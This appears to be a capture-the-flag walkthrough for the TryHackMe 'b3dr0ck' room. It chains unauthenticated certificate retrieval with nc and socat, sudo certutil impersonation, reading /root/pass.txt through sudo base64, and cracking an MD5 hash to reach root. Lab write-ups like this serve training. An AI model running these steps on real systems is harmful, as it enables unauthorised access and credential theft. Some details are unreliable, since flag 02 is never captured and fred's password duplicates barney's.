# b3dr0ck — TryHackMe Walkthrough

**Room:** b3dr0ck | **Difficulty:** Easy | **Category:** TLS / Certificate | **Flags:** 4

| Detail | Value |
|--------|-------|
| Target IP | 10.48.129.19 |
| Attack Machine | Kali Linux |

---

## Flags Overview

| # | Method |
|---|--------|
| 01 | SSH as barney |
| 02 | TLS service → certutil |
| 03 | su to fred |
| 04 | Crack MD5 hash → su root |

---

## Phase 1: Reconnaissance

```bash
nmap -sC -sV 10.48.129.19 -oN nmap_scan.txt
```

**Open Ports:**

| Port | Service |
|------|---------|
| 22/tcp | SSH (OpenSSH 8.2p1) |
| 80/tcp | HTTP (nginx 1.18.0, redirect → 4040) |
| 9009/tcp | Custom service (pichat?) |
| 4040/tcp | HTTPS web server |
| 54321/tcp | SSL secure login service |

---

## Phase 2: Foothold — Barney

### Recover Certificates from Port 9009
```bash
nc 10.48.129.19 9009
# Ask for: key
# Ask for: certificate
```
Save to `client.key` and `client.crt`.

### Get Barney's Password via Port 54321
```bash
socat stdio ssl:10.48.129.19:54321,cert=client.crt,key=client.key,verify=0
# Type: password
```
Password: **YabbaDabbaD0000!**

### SSH as Barney
```bash
ssh barney@10.48.129.19
Password: YabbaDabbaD0000!

cat barney.txt
```

**Flag 01 captured.**

---

## Phase 3: Lateral Movement — Barney → Fred

### Check Sudo
```bash
sudo -l
(ALL : ALL) /usr/bin/certutil
```

### Generate Fred's Certificate
```bash
sudo /usr/bin/certutil fred "Fred Flintstone"
```
Save cert/key, connect as Fred on port 54321, get password.

### Switch to Fred
```bash
su fred
Password: YabbaDabbaD0000!

cat fred.txt
```

**Flag 03 captured.**

---

## Phase 4: Privilege Escalation — Fred → Root

### Check Sudo
```bash
sudo -l
(ALL) NOPASSWD: /usr/bin/base32 /root/pass.txt
(ALL) NOPASSWD: /usr/bin/base64 /root/pass.txt
```

### Decode Root Password
```bash
sudo /usr/bin/base64 /root/pass.txt | base64 -d | base32 -d | base64 -d
# Output: a00a12aad6b7c16bf07032bd05a31d56
```

Crack via CrackStation → **flintstonesvitamins**

### Switch to Root
```bash
su root
Password: flintstonesvitamins

cat /root/root.txt
```

**Flag 04 captured.**

---

## Vulnerability Chain

1. **Exposed Credential Recovery** — Port 9009 serves TLS keys/certs with no authentication
2. **Certificate-Based Auth Bypass** — Port 54321 accepts any cert signed by the internal CA
3. **Abusable Sudo (certutil)** — Can generate certs for any user as root
4. **Sudo Password Read** — Can base32/base64 /root/pass.txt without password
5. **Weak Root Password** — Crackable via MD5 lookup

## Key Takeaways

- Custom TLS services without authentication are gold mines
- Certificate-based auth systems allow user impersonation
- Always check encoding chains (base64 → base32 → base64)
- CrackStation can crack unsalted MD5 instantly
